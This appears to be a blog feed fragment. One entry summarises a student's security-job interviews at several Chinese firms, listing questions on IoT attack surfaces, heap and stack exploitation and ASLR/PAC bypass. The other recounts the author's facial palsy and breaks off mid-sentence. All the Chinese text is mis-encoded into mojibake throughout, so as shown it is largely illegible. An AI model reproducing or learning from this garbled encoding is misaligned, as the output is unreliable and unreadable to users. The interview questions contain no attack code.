title="é¢ç»æ±‡æ€»"></a>é¢ç»æ±‡æ€»</h2><p>åœ¨ç§‹æ‹›ä¸­ä¸€å…±æŠ•äº†14å®¶ï¼Œå…¶ä¸­9å®¶ç»™äº†offerï¼ˆps. æœ¬æ¥æ·±ä¿¡æœä¹Ÿæœ‰çš„ï¼Œä½†æ˜¯æˆ‘å¿˜è®°å‚åŠ hré¢äº†ï¼Œ23333ï¼‰ï¼Œæœ€å6å®¶spï¼Œ3å®¶ç™½èœã€‚</p><h3 id="ç»¿ç›Ÿ"><a href="#ç»¿ç›Ÿ" class="headerlink" title="ç»¿ç›Ÿ"></a>ç»¿ç›Ÿ</h3><p>1é¢ 25min</p><ol><li>é¡¹ç›®1ä¸­çš„åè®®åˆ†æï¼Œåè®®é€†å‘é—®é¢˜</li><li>å·¥æ§ä¸­çš„fuzzæ”»å‡»é¢</li><li>é¡¹ç›®ä¸­çš„idaè„šæœ¬çš„ä½¿ç”¨</li><li>å°è±¡æœ€æ·±çš„å¤ç°æ¼æ´</li><li>MIPSæ¶æ„ä¸­çš„æµæ°´çº¿å¤„ç†ï¼ˆä¸€èˆ¬æ¥è¯´ä¼šå…ˆæ‰§è¡Œèµ‹å€¼æ“ä½œå†è¿›è¡Œè·³è½¬ï¼‰</li><li>è·å–å›½å¤–ä¿¡æ¯çš„æ¥æº ï¼ˆTwitter+ç„æ­¦çš„æ•´åˆæ•°æ®ç­‰ï¼‰</li><li>ä¼šæœ‰é’ˆå¯¹æ–‡ç« å¤ç°æ¼æ´å—ï¼Ÿ</li><li>åé—®ï¼Ÿ</li></ol><p>ä»‹ç»äº†ä¸€ä¸‹ç»¿ç›Ÿè¿™è¾¹IoTä¸»è¦åšçš„äº‹æƒ…ï¼Œå¬äº†ä¹‹åä»¥ä¸‹å‡ ç‚¹å§ã€‚ç„¶åä»–ä»¬å±…ç„¶è¿˜æœ‰ä¸“é—¨æ‰“æ¯”èµ›çš„äººã€‚ã€‚ã€‚æˆ‘è§‰å¾—è¿˜æ˜¯ç ”ç©¶çœŸå®è®¾å¤‡å¥½ã€‚</p><p>2é¢ 20min</p><p>å…¨ç¨‹åœ¨é—®é¡¹ç›®çš„ç›¸å…³é—®é¢˜ï¼Œä½†ä¹Ÿæ²¡æœ‰é—®çš„ç‰¹åˆ«ç»†è‡´ã€‚ã€‚ã€‚æ„Ÿè§‰æ˜¯ä¸ªé¢†å¯¼ã€‚ç„¶åé—®äº†æˆ‘å¯¹ç»¿ç›Ÿæ€ä¹ˆçœ‹ï¼Ÿå¯¹æ ¼ç‰©å®éªŒå®¤æ€ä¹ˆçœ‹ï¼Ÿ</p><h3 id="360"><a href="#360" class="headerlink" title="360"></a>360</h3><p>1é¢ 30min</p><ol><li>IoTè®¾å¤‡çš„æ”»å‡»é¢ä¸æ”»å‡»æ€è·¯</li><li>æœ€è¿‘æœ‰å…³æ³¨ä»€ä¹ˆè®®é¢˜â€”â€”Nasè®¾å¤‡çš„æ”»å‡»æ€è·¯</li><li>äºŒè¿›åˆ¶é‡Œé¢æ ˆæº¢å‡ºçš„åˆ©ç”¨ï¼Œæœ‰æ²¡æœ‰åˆ©ç”¨çš„å¯èƒ½</li><li>äºŒè¿›åˆ¶ä¸­çš„å †åˆ©ç”¨æ–¹æ³•</li><li>æ€ä¹ˆåˆ©ç”¨å †æ³„éœ²ä¿¡æ¯ï¼ˆåœ¨tcahceä¸­ç”¨cmallocçš„æ–¹æ³•å°±ä¸ä¼šæœ‰åˆå§‹åŒ–ï¼‰</li><li>é—®èƒ½ä¸èƒ½å®ä¹ </li><li>é—®äº†ä¸€äº›webæ–¹é¢çš„æ¼æ´åˆ©ç”¨ï¼Œæ¯”å¦‚å˜é‡è¦†ç›–</li><li>æœ¬ç§‘æ—¶å€™åšwebå®‰å…¨ç›¸å…³çš„å†…å®¹ï¼Œphpç‰ˆæœ¬çš„å˜åŒ–</li><li>ä¸€äº›æœ¬ç§‘æ—¶å€™åšçš„äº‹æƒ…ï¼Œåšäº†æ€ä¹ˆæ ·çš„webé¢˜ç›®</li></ol><p>2é¢ 15min</p><p>ç›´æ¥å°±æ˜¯hré¢äº†ã€‚ã€‚ã€‚ã€‚ä¹Ÿä¸çŸ¥é“æ˜¯ä»€ä¹ˆæƒ…å†µã€‚ã€‚æ”¿ä¼å®‰å…¨ï¼Œæœ€åæˆ‘æƒ³é—®æ˜¯å“ªä¸ªå®éªŒå®¤ï¼Œä¹Ÿæ²¡æ­£é¢å›ç­”æˆ‘ã€‚ã€‚ã€‚æœ€åè¿˜æ˜¯é—®äº†360çš„å¸ˆå‚…æ‰çŸ¥é“æ˜¯vulcanã€‚</p><h3 id="å¥‡å®‰ä¿¡"><a href="#å¥‡å®‰ä¿¡" class="headerlink" title="å¥‡å®‰ä¿¡"></a>å¥‡å®‰ä¿¡</h3><p>1é¢ 30min</p><ol><li>é—´æ¥è·³è½¬æ€ä¹ˆæ¢å¤çš„ï¼Ÿï¼ˆå¦‚æœæ˜¯å›è°ƒçš„æ–¹æ³•æ€ä¹ˆå¤„ç†ï¼Ÿï¼‰</li><li>å¦‚æœæ˜¯é‡åˆ°å¤æ‚çš„æ•°æ®ç»“æ„è¯¥å¦‚ä½•å¤„ç†ï¼Ÿ</li><li>ARMæ¶æ„çš„æ ˆæº¢å‡ºæ¼æ´åˆ©ç”¨å’ŒMIPSçš„åŒºåˆ«ï¼Ÿ</li><li>å¤ç°è¿‡çš„æ¼æ´è®²ä¸€ä¸ª</li><li>å¦‚æœç»™ä¸€ä¸ªé«˜éš¾åº¦ç›®æ ‡è®¾å¤‡ï¼Œæ€ä¹ˆå»åˆ†æï¼Ÿï¼ˆå­¦ä¹ å†å²æ¼æ´ï¼Œå½’çº³å‡ºå®¹æ˜“å‡ºç°é—®é¢˜çš„éƒ¨åˆ†é‡ç‚¹å…³æ³¨ï¼‰</li><li>åé—®</li></ol><p>ç»™äº†æˆ‘çš„ä¸€äº›éå¸¸å®ç”¨çš„å»ºè®®ï¼Œä¸­é—´è€æ¿è¿˜æ¥å¹²æ‰°æˆ‘ã€‚ã€‚ã€‚å¹¸å¥½é¢è¯•å®˜äººä¸é”™ã€‚</p><p>2é¢ 20min</p><ol><li>å›ºä»¶åˆ†æé¡¹ç›®ä¸­çš„æ•ˆæœå¦‚ä½•ï¼Ÿ</li><li>ä»‹ç»å®éªŒå®¤æƒ…å†µ</li></ol><p>ä¼¼ä¹æ˜¯ä¸€ä¸ªé¢†å¯¼ï¼Œæ²¡æ€ä¹ˆé—®é—®é¢˜å°±è¿™æ ·äº†ã€‚ã€‚ã€‚åªç¨å¾®äº†è§£äº†ä¸‹æƒ…å†µï¼Œå±…ç„¶é—®äº†æˆ‘å¯¼å¸ˆæ˜¯è°ï¼Ÿéœç®è¿˜çœŸæœ‰åã€‚</p><p>ä¸»è¦ç›®æ ‡æ˜¯æœ‰å•†ä¸šå®£ä¼ æ•ˆæœçš„å¤§æ¼æ´ã€‚é€šå¸¸æ˜¯äººå·¥å®¡è®¡çš„æ–¹æ³•ï¼Œwindowså’Œlinuxéƒ½æœ‰ï¼Œå¼€æºçš„ä¹Ÿæœ‰ï¼Œciscoå’Œåä¸ºï¼Œä¹Ÿæœ‰å…¬å¸çš„äº§å“ã€‚ä¸»è¦æ ¹æ®ä¸ªäººçš„æ–¹å‘æ¥å†³å®šã€‚</p><p>hré¢ 15min</p><ol><li>ä¸ºä»€ä¹ˆé€‰æ‹©åŒ—äº¬ï¼Ÿæ˜¯å¦å®¶é‡Œæœ‰äº²æˆšåœ¨è¿™é‡Œ</li><li>æœªæ¥çš„èŒä¸šå‘å±•æ–¹å‘</li><li>å…¶ä»–å…¬å¸çš„æŠ•é€’æƒ…å†µï¼Œè¿™ä¸ªhrå¾ˆäº†è§£ä¿¡å·¥æ‰€å‘€ï¼ŒçŸ¥é“æœ‰å¾ˆå¤šå¸ˆå…„éƒ½å»äº†åä¸º 23333</li><li>é—®äº†ç‚¹é¡¹ç›®ä¸­çš„åŸºæœ¬æƒ…å†µ</li><li>é¢„æœŸè–ªèµ„</li></ol><p>hrå§å§çš„ç”µè„‘æ‘„åƒå¤´æœ‰é—®é¢˜ï¼Œå¯¼è‡´æ²¡åŠæ³•ç”¨ç‰›å®¢ç½‘çš„é“¾æ¥ï¼Œå“ˆå“ˆå“ˆï¼Œå¯æƒœçœ‹ä¸åˆ°æ ·å­äº†ã€‚æ€»ä½“æ„Ÿè§‰è¿˜æ˜¯å¾ˆæ»¡æ„çš„ã€‚9æœˆä¸­æ—¬ä¼šç»™æ„å‘ä¹¦ã€‚</p><h3 id="æ·±ä¿¡æœ"><a href="#æ·±ä¿¡æœ" class="headerlink" title="æ·±ä¿¡æœ"></a>æ·±ä¿¡æœ</h3><p>1é¢ 45min</p><ol><li>é¡¹ç›®ä»‹ç»</li><li>æŒ‘æˆ˜åº”ç­”è¿‡ç¨‹çš„ç»†èŠ‚ç‚¹</li><li>å›ºä»¶åˆ†æäºŒè¿›åˆ¶çš„èƒŒæ™¯ï¼Œæœ€åå®Œæˆçš„æ•ˆæœ</li><li>è·¯ç”±å™¨å›ºä»¶æ¼æ´åˆ†æè°ƒè¯•é—®é¢˜ï¼Œå¦‚ä½•è¿½è¸ªè·¯å¾„ï¼Œä»¥åŠç¡®å®šè§¦å‘è¿™ä¸ªæ¼æ´ç‚¹</li><li>å¯†ç å­¦ä¸­çš„DESå’ŒAESçš„åŒºåˆ«ï¼ŸAESçš„å¯†é’¥é•¿åº¦å’ŒDESï¼Ÿå››ç§å—åŠ å¯†æ–¹å¼çš„åŒºåˆ« ï¼Ÿå“ªç§æœ€å¸¸ç”¨ï¼Ÿ</li></ol><p>é—®çš„å¥½ç»†ã€‚ã€‚ã€‚è€Œä¸”é—®åˆ°äº†æˆ‘å†™ä¸Šå»çš„å¯†ç å­¦ç›¸å…³çš„å†…å®¹ã€‚ã€‚ã€‚ã€‚æˆ‘åº”è¯¥å†å¤ä¹ å¤ä¹ çš„ã€‚æ¯”å¦‚ å¯†é’¥çš„é•¿åº¦é—®é¢˜ã€‚ã€‚ã€‚</p><p>2é¢ 25min</p><ol><li>é¡¹ç›®ä»‹ç»</li><li>é¡¹ç›®ä¸­é‡åˆ°çš„éš¾ç‚¹ï¼Œæœ€åæ˜¯æ€ä¹ˆè§£å†³çš„ï¼Ÿ</li><li>è·Ÿè¸ªè¿‡ä»€ä¹ˆgithubé¡¹ç›®å—ï¼Ÿ</li><li>Pythonçš„classæ˜¯ç”±ä»€ä¹ˆå¯¹è±¡åˆ›å»ºçš„</li><li>Pythonçš„åƒåœ¾å›æ”¶æœºåˆ¶</li><li>ç¬¬äºŒä¸ªé¡¹ç›®æ˜¯æœ‰å‡ ä¸ªäººåšçš„ï¼Ÿæˆ‘åšäº†å“ªä¸ªéƒ¨åˆ†</li><li>æ¼æ´ç¼“è§£æœºåˆ¶ï¼Ÿä»¥åŠå¦‚ä½•çªç ´å®ƒä»¬ï¼Ÿ</li><li>å¤ç°çš„æ¯”è¾ƒæœ‰æ„æ€çš„æ¼æ´</li></ol><p>æ„Ÿè§‰è¿˜ç®—ä¸é”™ï¼Œåº”è¯¥æ˜¯ä¸ªé¢†å¯¼ã€‚</p><p>åŠ é¢ 25min</p><ol><li>é¡¹ç›®ä»‹ç»</li><li>å¤ç°çš„æ¼æ´</li><li>æŒ–æ˜è¿‡çš„æ¼æ´</li><li>baseåœ°ç‚¹</li><li>èŒä¸šæ–¹å‘</li><li>æœ‰æ²¡æœ‰æè¿‡windowsç›¸å…³çš„ç¨‹åº</li><li>å›ºä»¶åŠ å¯†ä¹‹åæ€ä¹ˆç ´è§£</li></ol><p>æ²¡æƒ³åˆ°è¿˜æ˜¯åŠ é¢äº†ã€‚ã€‚ã€‚æœ‰ç‚¹ç¥å¥‡ã€‚ã€‚ã€‚ä¸è¿‡æœ€åçš„hré¢å¿˜è®°å‚åŠ äº†ï¼Œ23333ã€‚</p><h3 id="å¤§ç–†"><a href="#å¤§ç–†" class="headerlink" title="å¤§ç–†"></a>å¤§ç–†</h3><p>1é¢ 30min</p><ol><li>å›ºä»¶ç­¾åæ€ä¹ˆåšï¼Ÿ</li><li>å¯¹ç§°åŠ å¯†å’Œéå¯¹ç§°åŠ å¯†çš„åŒºåˆ«</li><li>è®²è®²AESåŠ å¯†ç®—æ³•</li><li>é—®é—®é¡¹ç›®å®ç°ç»†èŠ‚</li><li>åˆ†æè¿‡å“ªäº›å›ºä»¶ï¼Œè¯´ä¸€è¯´æ€ä¹ˆåˆ†æï¼Œæ€ä¹ˆæ‰¾æ¼æ´</li><li>å·¥æ§åè®®è®¤è¯ä¸­çš„ç¼ºé™·é—®é¢˜</li></ol><p>å¤§ç–†è¿™è¾¹çš„å®‰å…¨éƒ¨ä¸»è¦åšæ— äººæœºå’Œå®‰å…¨äº§å“æ–¹é¢çš„å·¥ä½œï¼Œè¿˜æœ‰ä»åº•å±‚èŠ¯ç‰‡åˆ°ä¸Šå±‚åº”ç”¨çš„å®‰å…¨æµ‹è¯•ã€‚</p><p>2é¢40min</p><ol><li>ç®€å•é¡¹ç›®ä»‹ç»</li><li>æœ€æœ‰æˆå°±æ„Ÿçš„é¡¹ç›®ï¼Œå“ªäº›å·¥ä½œæ¯”è¾ƒæœ‰äº®ç‚¹</li><li>é’ˆå¯¹é¡¹ç›®ä»‹ç»ä¸€ä¸ªä¾‹å­</li><li>æº¢å‡ºæ¼æ´æ€ä¹ˆåˆ©ç”¨</li><li>å¯¹å¤§ç–†æ— äººæœºæœ‰ä»€ä¹ˆäº†è§£ï¼Ÿæ€ä¹ˆæ”»å‡»ï¼Ÿæ€ä¹ˆåšæ¼æ´æŒ–æ˜</li><li>hashè®¡ç®—ä¸ºä»€ä¹ˆè¦åŠ ç›</li><li>macå’Œç­¾åçš„åŒºåˆ«</li><li>é˜²å¾¡è¿™ä¸€å—åšäº†å“ªäº›äº‹æƒ…</li><li>æ¼æ´æŒ–æ˜ä¸­çš„å‰æ²¿æŠ€æœ¯ï¼Œæœ‰å“ªäº›å›¢é˜Ÿåœ¨åš</li><li>æœ€è¿‘ç½‘ç»œå®‰å…¨å‘ç”Ÿçš„å¤§äº‹ä»¶æˆ–è€…çªç ´æ€§çš„æŠ€æœ¯</li><li>æœªæ¥ä¸‰å¹´çš„èŒä¸šè§„åˆ’</li></ol><p>æ˜¯ä¸ªå°é¢†å¯¼ï¼Œæˆ‘é—®äº†å…³äºç‰©è”ç½‘å®‰å…¨æœªæ¥çš„å‘å±•é—®é¢˜ï¼Œä»–è®²äº†å¤§ç–†åœ¨å®‰å…¨å¯¹æŠ—ä¸­åšå‡ºçš„æˆç»©ï¼Œæ¯”å¦‚åœ¨ç¦é£åŒºçš„å¯¹æŠ—ä¸Šï¼Œæ‘„åƒå¤´çš„å®‰å…¨ï¼Œä¸ç¤¾åŒºçš„ç ´è§£å¯¹æŠ—ã€‚</p><p>3é¢ 25min</p><ol><li>ç®€å•ä»‹ç»è‡ªå·±ç ”ç©¶çš„æ–¹å‘</li><li>å¯¹å¤§ç–†çš„äº†è§£</li><li>å¹³æ—¶çš„å…´è¶£çˆ±å¥½</li><li>å¯¹å“ªäº›ç”µå­äº§å“æ„Ÿå…´è¶£ï¼Œä»¥åŠè‡ªå·±å¯¹ç”µå­äº§å“çš„ç†è§£</li><li>å¯¹æ— äººæœºå¦‚ä½•åšæ”»å‡»</li><li>åé—®</li></ol><p>hré¢æ˜¯ä¸€ä¸ªä¸­å¹´è€ç”·äººï¼Œå¤´å‘ç¨€ç–ã€‚ã€‚ã€‚æœ‰ç‚¹å®³æ€•ï¼Œä½†äººè¿˜æ˜¯å¾ˆå’Œè”¼ï¼Œæˆ‘èƒ½æ„Ÿè§‰åˆ°ä»–é€šè¿‡é¢è¯•è®°å½•çŸ¥é“æˆ‘ä¸å¤ªäº†è§£ä»–ä»¬å…¬å¸çš„äº§å“ï¼Œæ‰€ä»¥æˆ‘ç€é‡çš„åˆå»çœ‹äº†ä¸€éä»–ä»¬çš„å®˜ç½‘ï¼Œæ²¡æƒ³åˆ°æœç„¶é—®äº†ï¼Œ2333ã€‚æ¯”è¾ƒæœ‰æ„æ€çš„ä¸€ç‚¹ï¼Œæˆ‘åé—®äº†ä¸ºä»€ä¹ˆä»–ä»¬åšå®‰å…¨çš„å›¢é˜Ÿä¼šåœ¨ä¸Šæµ·è€Œä¸æ˜¯åœ¨æ·±åœ³çš„æ€»éƒ¨ï¼ŒåŸæ¥æ˜¯å› ä¸ºå†å²é—ç•™çš„é—®é¢˜ï¼Œå¯¼è‡´ä¸Šæµ·çš„å®‰å…¨éƒ¨é—¨éƒ½åœ¨ä¸Šæµ·å‘å±•ã€‚</p><h3 id="åä¸º"><a href="#åä¸º" class="headerlink" title="åä¸º"></a>åä¸º</h3><p>1é¢ 60minï¼ˆä¸»è¦æ˜¯å†™é¢˜å†™äº†30minéƒ½æ²¡å†™å‡ºæ¥ã€‚ã€‚ã€‚ã€‚ï¼‰</p><ol><li>é¡¹ç›®ä»‹ç»ï¼Œä»¥åŠé¡¹ç›®ä¸­çš„ç»†èŠ‚ç‚¹</li><li>double freeå¦‚ä½•åˆ©ç”¨</li><li>å†…æ ¸å±‚ä¸­è¿›ç¨‹é—´é€šä¿¡æ€ä¹ˆå®ç°çš„</li><li>å†…æ ¸ä¸­å¯¹æ‰“å¼€æ–‡ä»¶åœ¨è¿›ç¨‹ä¸­å¦‚ä½•å…±äº«</li><li>ä½ æœ€ç†Ÿæ‚‰çš„è¯­è¨€æ˜¯ä»€ä¹ˆï¼Ÿå¯¹C++çš„æŒæ¡ç¨‹åº¦</li></ol><p>è€ƒäº†ä¸€é“å‰åºéå†æ•°çš„éªŒè¯ã€‚ã€‚ã€‚ä»–æç¤ºäº†åŠå¤©ï¼Œæˆ‘å·®ç‚¹å°±å†™å‡ºæ¥äº†ï¼Œæœ€åä»–è¯´ä»€ä¹ˆå¼•ç”¨è®¡æ•°ã€‚ã€‚ã€‚è¿™è¯´æ³•å¤ªè¯±å¯¼æ€§äº†ã€‚å®Œå…¨æƒ³åã€‚</p><p>2é¢ 40min</p><ol><li>é¡¹ç›®ä»‹ç»</li><li>å †æº¢å‡ºæ¼æ´åˆ©ç”¨</li><li>UAFæ¼æ´åˆ©ç”¨</li><li>æ ˆæº¢å‡ºæ¼æ´åˆ©ç”¨</li><li>IoTæ¼æ´å¦‚ä½•è°ƒè¯•ä»¥åŠæ”»å‡»é¢æ¢æµ‹</li><li>åŠ¨æ€åˆ†æäº†è§£çš„æƒ…å†µ</li><li>é™æ€åˆ†æäº†è§£çš„æƒ…å†µ</li></ol><p>è€ƒäº†ä¸€é“æ‹¬å·åŒ¹é…çš„é¢˜ç›®ï¼Œè¿˜å¥½å­¦é•¿ç»™æˆ‘è¯´è¿‡ï¼Œè¦ä¸ç„¶çœŸçš„å°´å°¬äº†ã€‚</p><p>3é¢ 30min</p><ol><li>è¯¢é—®å­¦æ ¡çš„ä¸“ä¸šå’ŒæŠ€èƒ½æŒæ¡æƒ…å†µ</li><li>æœªæ¥çš„å‘å±•è§„åˆ’</li><li>é’ˆå¯¹ASLRå¦‚ä½•ç»•è¿‡</li><li>é’ˆå¯¹PACå¦‚ä½•ç»•è¿‡</li><li>åœ¨CTFé‡Œé¢è·å¾—è¿‡æœ€å¥½çš„æˆç»©æ˜¯ä»€ä¹ˆ</li><li>è€å®¶åœ¨å“ªé‡Œï¼Ÿçˆ¶æ¯çš„å·¥ä½œæƒ…å†µ</li><li>å·¥ä½œåœ°ç‚¹çš„é€‰æ‹©ï¼Œçˆ¶æ¯æœ‰æ²¡æœ‰åå¯¹</li><li>å¯¹åä¸ºçš„æ–‡åŒ–æœ‰ä»€ä¹ˆäº†è§£ï¼Ÿ</li><li>ç§‘ç ”ä¸­é‡åˆ°çš„é—®é¢˜ï¼Ÿæœ€åæ€ä¹ˆè§£å†³çš„ï¼Ÿ</li><li>å¯¹åŠ ç­æœ‰ä»€ä¹ˆçœ‹æ³•ï¼Ÿ</li><li>é™¤äº†å®‰å…¨ï¼Œå¯¹å…¶ä»–æ–¹é¢è¿˜æœ‰ä»€ä¹ˆç ”ç©¶</li><li>æ‰‹ä¸Šæœ‰å“ªäº›offerï¼Ÿåä¸ºç»™äº†ä½ offerä¹‹åä¼šæ€ä¹ˆé€‰æ‹©ï¼Ÿå¦‚æœåä¸ºçš„é’±æ²¡é‚£äº›å…¬å¸é«˜æ€ä¹ˆåŠï¼Ÿ</li><li>åé—®</li></ol><p>è¿™ä¸ªä¸»ç®¡äººè¿˜å¾ˆå¥½ï¼Œåœ¨æœ€åè¿˜é˜¶æ®µä»‹ç»äº†åä¸ºçš„åŸºæœ¬æƒ…å†µã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;å¸ˆå…„ä»¬æ›¾åœ¨ç‰›å®¢ä¸Šæ€»ç»“äº†è‡ªå·±çš„ç§‹æ‹›ï¼Œåœ¨åå¤é˜…è¯»çš„è¿‡ç¨‹ä¸­æ·±å—é¼“èˆï¼Œæ‰€ä»¥åœ¨æˆ‘çš„ç§‹æ‹›åŸºæœ¬å‘Šä¸€æ®µè½ä¹‹åä¹Ÿæ˜¯é€‰æ‹©è®°å½•ä¸‹æ¥ï¼Œä¸ºç¤¾åŒºè´¡çŒ®ä¸€ç‚¹å¾®è–„ä¹‹åŠ›ã€‚&lt;/p
      
    
    </summary>
    
      <category term="æ‚è°ˆ" scheme="https://hurricane618.me/categories/%E6%9D%82%E8%B0%88/"/>
    
    
      <category term="æ±‚èŒ" scheme="https://hurricane618.me/tags/%E6%B1%82%E8%81%8C/"/>
    
  </entry>
  
  <entry>
    <title>è®°æœ€è¿‘ä¸€ä¸ªæœˆé¢ç˜«é‚£ç‚¹äº‹</title>
    <link href="https://hurricane618.me/2021/06/09/2021-face-has-some-problems/"/>
    <id>https://hurricane618.me/2021/06/09/2021-face-has-some-problems/</id>
    <published>2021-06-09T03:07:13.000Z</published>
    <updated>2021-06-09T03:07:13.033Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™ä¸ªæ ‡é¢˜çœ‹èµ·æ¥ç¡®å®æœ‰ç‚¹æƒŠæ‚šï¼Œä½†å®é™…ä¸Šä¹Ÿåªæ˜¯å¾—äº†ä¸€ä¸ªæœ‰ç‚¹ç‰¹æ®Šçš„ç—…ã€‚å¥½åœ¨å·²ç»æ¢å¤çš„å·®ä¸å¤šäº†ï¼Œè®°å½•ä¸€ä¸‹å‘ç”Ÿè¿‡åå¦‚ä½•å¤„ç†ï¼Œåº”å¯¹ä»¥åŠä¼šç»™ç”Ÿæ´»å¸¦æ¥ä»€ä¹ˆæ ·çš„å½±å“ã€‚</p><h2 id="äº‹å‘ä¹‹å‰çš„å¾å…†ï¼Ÿ"><a href="#äº‹å‘ä¹‹å‰çš„å¾å…†ï¼Ÿ" class="headerlink" title="äº‹å‘ä¹‹å‰çš„å¾å…†ï¼Ÿ"></a>äº‹å‘ä¹‹å‰çš„å¾å…†ï¼Ÿ</h2><p>å¾—è¿™ä¸ªç—…çš„æ—¶æœºæ¯”è¾ƒå¥‡æ€ªï¼Œåœ¨è¢«æ´¾å»å‡ºå·®ä¹‹åçš„ç¬¬äºŒå¤©å°±å¼€å§‹äº†ã€‚ã€‚ã€‚èµ·åˆæ˜¯ä¸‹åˆçš„æ—¶å€™å³çœ¼çš®å¼€å§‹ç‹‚è·³ï¼Œä½“æ„Ÿä¸Šè·³äº†å¾ˆä¹…æœ‰åŠå°æ—¶åˆ°ä¸€å°æ—¶å·¦å³ï¼Œé™¤äº†å³çœ¼çš®ç‹‚è·³ä¹‹å¤–èº«ä½“ä¹Ÿå¾ˆç–²å€¦ï¼Œè„‘å­å®Œå…¨ä¸å¤ªæƒ³åŠ¨ï¼Œé‚£ä¸ªæ—¶å€™æœ¬æ¥æƒ³ç€å»ä¼‘æ¯çš„ï¼Œä½†è€ƒè™‘åˆ°è¿™æ‰ç¬¬äºŒå¤©è€Œä¸”è¿˜æœ‰äººçœ‹ç€ï¼Œç›´æ¥æºœå»ä¼‘æ¯å¤ªä¸å¥½ï¼Œå°±ä¸€ç›´é¡¶ç€ã€‚ã€‚ã€‚æœ€ååˆ°æ™šä¸Šåƒé¥­çš„æ—¶å€™å‘ç°å³è¾¹çš„å˜´æœ‰ç‚¹æŠ¬ä¸èµ·æ¥ï¼Œåƒé¥­æ¯”è¾ƒåƒåŠ›ï¼Œåˆ°æ™šä¸Šå›å®¿èˆçš„æ—¶å€™å·²ç»èƒ½å¤Ÿå‘è§‰å³åŠè¾¹çš„å˜´æ— æ³•å’Œå·¦åŠè¾¹åŒæ­¥ã€‚ç¬‘çš„æ—¶å€™å˜´æ˜¯æ­ªçš„ï¼Œ23333ï¼ˆæ­ªå˜´é¾™ç‹è­¦å‘Šï¼‰</p><h2 id="äº‹å‘ä¹‹å"><a href="#äº‹å‘ä¹‹å" class="headerlink" title="äº‹å‘ä¹‹å"></a>äº‹å‘ä¹‹å</h2><p>å½“å¤©æ™šä¸Šå°±å¼€å§‹googleæœç´¢ç›¸å…³çš„ç—‡çŠ¶ï¼Œæœå‡ºæ¥çš„ç»“è®ºæ˜¯å¾—äº†é¢ç˜«ï¼Œå½“æ—¶ç›´æ¥å“å°¿æˆ‘ï¼Œå¿ƒé‡Œé¢æ…Œå¾—ä¸€æ‰¹ï¼Œåˆæœäº†é¢ç˜«è¯¥æ€ä¹ˆåŠï¼Œå¾—çŸ¥æœ‰ä¸¤ç§é¢ç˜«â€”â€”ä¸­æ¢æ€§é¢ç˜«å’Œå‘¨å›´æ€§é¢ç˜«ï¼Œæˆ‘æ‰åˆšå‘ç—…ä¸ä¹…è¿˜æ— æ³•æ˜ç¡®åˆ¤æ–­ï¼Œäºæ˜¯ç¬¬äºŒå¤©ä¸­åˆï¼Œå·å·ä»é¡¹ç›®åœ°ç‚¹æºœå‡ºå»çœ‹äº†ä¸€å®¶å°åŒ»é™¢ï¼Œçœ‹çš„æ˜¯ä¸€ä¸ªä¸­åŒ»ï¼Œç®€å•æ£€æŸ¥ä¹‹åè¯´è¿‡ä¸€å‘¨å†çœ‹æƒ…å†µï¼Œå¹¶ä¸”è¯´å‘ç—…åçš„ä¸¤ä¸‰å¤©ä¼šé€æ¸ä¸¥é‡ï¼ˆè¿™é‡Œå’Œç½‘ä¸Šçš„èµ„æ–™æè¿°ç›¸ç¬¦åˆï¼Œæ‰€ä»¥æˆ‘ä¹Ÿå°±å¬ä»äº†å»ºè®®ï¼‰ã€‚è¿™ä¸ªè€åŒ»ç”Ÿå¾ˆå¥½çš„ä¸€ç‚¹æ˜¯è®©æˆ‘æŠŠæŒ‚å·è´¹é€€äº†ï¼Œ23333ï¼Œå°‘èŠ±20å—ï¼Œç¬¬ä¸€æ¬¡çœ‹åŒ»ç”Ÿå°±è¿™æ ·ç»“æŸäº†ã€‚</p><p>åœ¨è¿‡äº†ä¸¤å¤©ä¹‹åï¼Œç—‡çŠ¶æœç„¶å¼€å§‹ä¸¥é‡ï¼Œèƒ½å¤Ÿåˆ¤æ–­å‡ºæ˜¯å¾—äº†å‘¨å›´æ€§é¢ç˜«ï¼Œå¿ƒé‡Œæš‚æ—¶æ¾äº†ä¸€å£æ°”ï¼Œä¸­æ¢æ€§æ›´ä¸¥é‡ä¸€ç‚¹ï¼Œåœ¨è¿‡äº†å¤§æ¦‚ä¸€å‘¨ä¹‹åï¼Œçªç„¶åˆè¢«å«å»åšå¦å¤–ä¸€ä¸ªé¡¹ç›®ï¼ˆå¤§å¿™äºº å“­å”§å”§ï¼‰ï¼Œåœ¨å›æ‰€çš„æ—¶å€™å’Œå¸ˆå…„ä»¬èŠäº†ä¼šå„¿å¾—ç—…çš„æƒ…å†µï¼Œè¢«ç›´æ¥è­¦å‘Šå¤§æ¦‚ç‡æ˜¯ä¸­é£ï¼ˆæˆ‘ï¼šï¼Ÿï¼Ÿï¼Ÿï¼‰ï¼Œå‡ºäºç¨³å¦¥çš„è€ƒè™‘æˆ‘å†³å®šå†å»ä¸€ä¸ªå¤§åŒ»é™¢çœ‹çœ‹æƒ…å†µã€‚å½“æ—¶å…ˆæŒ‚çš„ç¥ç»å†…ç§‘ï¼Œè¿›å»ä¹‹ååŒ»ç”Ÿè¯´å‘¨å›´æ€§é¢ç˜«ä¸å½’æˆ‘ç®¡ï¼Œå¿ƒé‡Œé¢åˆç¨³äº†å¾ˆå¤šï¼Œçœ‹æ¥ä¸æ˜¯ä¸­é£ï¼Œç›´æ¥æ¢å·æˆç¥ç»å¤–ç§‘ï¼ŒåŒ»ç”Ÿä¹Ÿæ²¡é—®å¤ªå¤šæƒ…å†µï¼Œè¿˜æ˜¯åŒæ ·çš„æœ‰æ²¡æœ‰ç€å‡‰å¹é£ï¼Œå¾—çŸ¥æ²¡æœ‰ä¹‹åï¼Œå°±å¼€å§‹è¯´äº›æœ‰çš„æ²¡çš„ï¼Œâ€ä½ 